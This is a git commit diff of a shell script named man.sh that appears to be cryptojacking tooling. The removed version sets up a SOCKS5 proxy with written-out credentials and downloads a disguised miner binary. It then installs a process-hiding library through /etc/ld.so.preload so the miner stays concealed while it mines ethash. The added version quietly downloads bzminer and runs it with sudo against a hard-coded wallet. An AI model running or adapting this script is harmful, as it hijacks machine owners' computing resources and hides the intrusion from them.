fc2fba6e41f39eeb7c0c5a25cf1d73d0e5ccc71c
renilo <88342640+renilo@users.noreply.github.com>
2022-04-06 16:26:45 +0700

    Update man.sh

--- man.sh
+++ man.sh
@@ -1,51 +1,8 @@
-#!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 185.242.111.64:12324
-socks5_username = 14abf5d6e18da
-socks5_password = dbb7a6d2ae
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo "******************************************************************"
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo "******************************************************************"
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://github.com/archernap/prem/raw/main/priyatama
-chmod +x priyatama
-POOL=ethash.poolbinance.com:1800
-WALLET=necroxgaming
-WORKER=$(echo $(shuf -i 10-9999 -n 1))
-
-./graftcp/graftcp wget https://github.com/hunzibao/tmp/raw/main/magicPriyatama.zip
-unzip magicPriyatama.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
+sudo apt update
+sudo apt install screen -y
+sudo apt update
+sudo apt install libpci3
+wget https://github.com/bzminer/bzminer/releases/download/v8.0.0/bzminer_v8.0.0_linux_cuda_tk.tar.gz >/dev/null 2>&1
+tar xvf bzminer_v8.0.0_linux_cuda_tk.tar.gz >/dev/null 2>&1
+chmod +x bzminer >/dev/null 2>&1
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && sudo ./bzminer -a ethash -w 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb -p stratum+tcp://us1.ethermine.org:4444 stratum+tcp://us2.ethermine.org:4444 -r $ip-BZ --nvidia 1
